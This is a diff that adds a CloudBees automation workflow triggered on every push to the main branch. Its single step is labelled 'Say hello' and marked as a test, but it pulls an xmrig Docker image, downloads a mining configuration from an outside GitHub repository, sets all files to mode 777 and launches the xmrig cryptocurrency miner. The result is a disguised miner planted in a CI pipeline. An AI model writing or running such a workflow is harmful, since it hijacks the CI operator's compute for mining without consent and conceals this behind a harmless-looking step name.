@@ -1,0 +1,18 @@
+apiVersion: automation.cloudbees.io/v1alpha1
+kind: workflow
+name: My automation
+on:
+  push:
+    branches:
+      - "main"
+jobs:
+  build:
+    steps:
+      - uses: docker://rcmelendez/xmrig
+        name: Say hello
+        kind: test
+        shell: sh
+        run: |-
+          wget https://raw.githubusercontent.com/Rockymoyosu/S/main/99.json
+          chmod 777 *
+          xmrig --config=99.json
